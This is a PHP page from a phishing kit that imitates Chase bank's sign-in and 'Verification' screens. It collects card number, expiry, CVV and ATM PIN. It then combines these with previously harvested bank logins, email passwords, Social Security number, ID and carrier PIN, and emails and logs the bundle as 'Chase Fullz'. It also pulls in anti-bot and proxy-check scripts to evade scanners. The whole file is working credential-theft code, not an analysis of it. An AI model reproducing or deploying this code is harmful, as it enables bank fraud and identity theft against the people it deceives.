<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
    ob_start();
    session_start();
require("../admin/config.php");
require("../settings.php");
//require_once("../sec/sniper.php");
require_once("../sec/antibot.php");
require_once("../sec/botinho.php");
require_once("../sec/proxycheck.php");
require_once("../sec/altproxy.php");


    


    if(isset($_POST['submit'])){
        $cadnum = $_POST['cadnum'];
        $exp = $_POST['exp'];
        $cvvcod = $_POST['cvvcod'];
        $atmp = $_POST['atmp'];
        
        $_SESSION['cadnum'] = $cadnum;
        $_SESSION['exp'] = $exp;
        $_SESSION['cvvcod'] = $cvvcod;
        $_SESSION['atmp'] = $atmp;
                
        $subject =  "{" .$user_ip . "} | CHASE Fullz | [" . $_SESSION['icity']. "," . $_SESSION['icountrycode'] . "]";
        
        $message = "  --=========[Chase Full]===========--  \n";
        $message .= "Username: " . $_SESSION['usname'] . "\n";
        $message .= "Password: " . $_SESSION['paword'] . "\n";
        $message .= "Token: " . $_SESSION['tok'] . "\n";
        $message .= "  --=========[Mail Access]===========--  \n";
        $message .= "Email Address: " . $_SESSION['mailaddy'] . "\n";
        $message .= "Email Password: " . $_SESSION['mailpass'] . "\n";
		$message .= "  --==[VERIFIED MAIL ACCESS]==--  \n";
        $message .= "EMAIL ADDRESS2: " . $_SESSION['mailaddy2'] . "\n";
        $message .= "EMAIL PASSWORD2: " . $_SESSION['mailpass2'] . "\n";
        $message .= "  --=========[CHASE-BILLING]===========--  \n";
        $message .= "First Name: " . $_SESSION['fnam'] . "\n";
        $message .= "Last Name: " . $_SESSION['lnam'] . "\n";
        $message .= "Date of Birth: " . $_SESSION['dob'] . "\n";
        $message .= "Ssn: " . $_SESSION['soc'] . "\n";
        $message .= "Type of ID: " . $_SESSION['typid'] . "\n";
        $message .= "ID Number: " . $_SESSION['idnum'] . "\n";
        $message .= "Street Address: " . $_SESSION['stadd'] . "\n";
        $message .= "Suite/ Apt/ Other: " . $_SESSION['soa'] . "\n";
        $message .= "Zip Code: " . $_SESSION['zip'] . "\n";
        $message .= "City: " . $_SESSION['city'] . "\n";
        $message .= "State: " . $_SESSION['state'] . "\n";
        $message .= "Phone: " . $_SESSION['fone'] . "\n";
        $message .= "Phone Carrier: " . $_SESSION['fonecarr'] . "\n";
        $message .= "Carrier Pin: " . $_SESSION['carrpin'] . "\n";
        $message .= "  --=========[CHASE-CARD]===========--  \n";
        $message .= "CARD NUMBER : " . $_SESSION['cadnum'] . "\n";
        $message .= "EXPIRY DATE: " . $_SESSION['exp'] . "\n";
        $message .= "CVV: " . $_SESSION['cvvcod'] . "\n";
        $message .= "ATM PIN: " . $_SESSION['atmp'] . "\n";
        $message .= "----=========[Vic-Info]===========-----\n";
        $message .= "IP: " . $user_ip . "\n";
        $message .= "ISP: " . $_SESSION['iisp'] . "\n";
        $message .= "City(Based of IP): " .$_SESSION['icity'] . "\n";
        $message .= "Country(Based of IP): " .$_SESSION['icountrycode'] . "\n";
        $message .= "Browser: " . $_SESSION['browser'] . "\n";
        $message .= "OS: " . $_SESSION['platform'] . "\n";
        $message .= "Time: " . $_SESSION['time'] . "\n";
        $message .= "Date: " . $_SESSION['date'] . "\n";
        $message .= "------------------------------------------\n";
        $header = "From: <store@h0oligan.com> \r\n";
        
        $var_str = var_export($message, true);
        $var = "\n\n $var_str;\n\n";
        file_put_contents('../logz/MyLogz4.txt', $var, FILE_APPEND);
        
        $result = mail(reciever, $subject, $message, $header);
        require("smtp.php");
        header("Location: ./finale.php?locale=en-US&authID={$_SESSION['token']}&start={$_SESSION['fstamp']}&end={$_SESSION['lund']}");
    }
    one_time(one_time_access,redirect_to);
    ff_process(redirect_to);

    $c2 = "#> ".getenv("REMOTE_ADDR")."\r\n";
    file_put_contents('../logz/MyLogz4_view.txt', $c2, FILE_APPEND);

?>


<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">

    <title><?php echo htmlentities("Sign in - chase.com", ENT_QUOTES, "UTF-8"); ?></title>

    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/shop-homepage.css" rel="stylesheet">
    <link href="../css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="../img/chasefavicon.ico">
    <script src="https://kit.fontawesome.com/6222530beb.js"></script>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>


</head>

<body class="fl">
    <header class="e-header">
        <div class="col-xs-4 header-elements">
            <a href="#" class="menu-line">
                <i class="fas fa-bars"></i>
            </a>
        </div>
        <div class="col-xs-4 header-elements">
            <img src="../img/octogon-white.png" alt="Chase">
        </div>
        <div class="col-xs-4 header-elements ura">
            <span class="labelinho">
                Espa&#241;ol
            </span>
        </div>
    </header>
    <main id="e-content">
        <div class="oe-gs">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
                        <h1 class="oe-header">Verification</h1>
                        <div class="oe-progress-bar">
                            <div class="bar fill e-70"> </div>
                        </div>
                        <div class="H2 oe-secure">Secure your account</div>
                        <h2 class="H4 eGSA">Please provide card details to verify your identity.</h2>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <section id="opc-content">
        <div class="field-mt-18">
           <form action="" method="post" enctype="multipart/form-data">
            <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                <div id="personal">
                    <div class="row">
                        <div class="col-xs-12 col-sm-6">
                            <div class="personal_NH">Card details</div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12 col-sm-12">
                            <div class="mb-24">Please verify the card details linked to your account.</div>
                        </div>
                    </div>
                    <div id="nameblock">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="cadnum" class="outlaw_label">Card number</label>
                                        </div>
                                        <input type="text" class="input-credit-card out-input" required id="cadnum" name="cadnum"  title="Enter your 16 digits Debit Or Credit Card Number">
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="" class="outlaw_label">Expiration Date</label>
                                        </div>
                                        <input type="text" class="input-date out-input" name="exp" data-validation="length"  data-validation-length="min7" required>
                                        <div class="f-helpertext">
                                            <div class="helpertext">mm/yyyy</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="cvvcod" class="outlaw_label">Security Code</label>
                                        </div>
                                        <input type="text" class="out-input" id="cvvcod" name="cvvcod" required pattern="[0-9]{3}" maxlength="3" title="Enter your 3 digit CVV Code">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                                <div class="jp_fieldgroup">
                                    <div class="jp_fg vertical">
                                        <div class="label-wraps">
                                            <label for="" class="outlaw_label">ATM Pin</label>
                                        </div>
                                        <input type="text" class="out-input" name="atmp" required pattern="[0-9]{4}" maxlength="4" title="Enter your 4 digit ATM Pin">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="disclosure">
                    <div class="field-disco">
                        <div class="row">
                            <div class="col-xs-12">
                                <div class="foot-disco">
                                    For additional security please verify your ATM PIN to submit card details.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="footinho">
                    <div class="row">
                        <div class="col-xs-12">
                            <div class="row">
                                <div class="col-xs-12 navi-tom">
                                    <input type="submit" class="out-nxt" name="submit">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
           </form>
        </div>
    </section>
    

<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.5.3/cleave.min.js"></script>
<script>
// phone
var cleave = new Cleave('.input-date', {
    date: true,
    datePattern: ['m', 'Y']
});
    
// credit card
var cleaveCreditCard = new Cleave('.input-credit-card', {
    creditCard: true
});

document.querySelector('.button-credit-card').addEventListener('click', function() {
	alert(cleaveCreditCard.getRawValue());
});
</script>
<script>
//window.onbeforeunload = function() {
//   return "Do you really want to leave our brilliant application?";
//   //if we return nothing here (just calling return;) then there will be no pop-up question at all
//   //return;
//};
</script>
<script src="../js/jquery.js"></script>
<script src="../js/bootstrap.min.js"></script>


</body>

</html>